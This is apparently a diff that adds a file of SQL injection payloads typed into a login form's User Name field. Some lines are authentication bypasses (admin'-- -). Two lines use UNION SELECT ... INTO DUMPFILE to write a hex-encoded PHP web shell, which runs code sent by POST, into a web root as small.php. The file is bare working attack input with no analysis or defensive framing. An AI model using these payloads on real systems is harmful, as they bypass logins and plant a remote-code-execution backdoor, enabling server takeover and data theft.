@@ -1,0 +1,12 @@
+User Name:admin'-- -
+Password:
+User Name:admin"-- -
+Password:
+User Name:admin'-- -
+Password:
+User Name:admin"-- -
+Password:
+User Name:admin" union select 0x3c3f70687020406576616c28245f504f53545b2770617373275d293b3f3e,2,3 into dumpfile '/home/wwwroot/default/small.php'
+Password:
+User Name:admin" union select 0x3c3f70687020406576616c28245f504f53545b2770617373275d293b3f3e,2,3 into dumpfile '/home/wwwroot/default/small.php'
+Password:
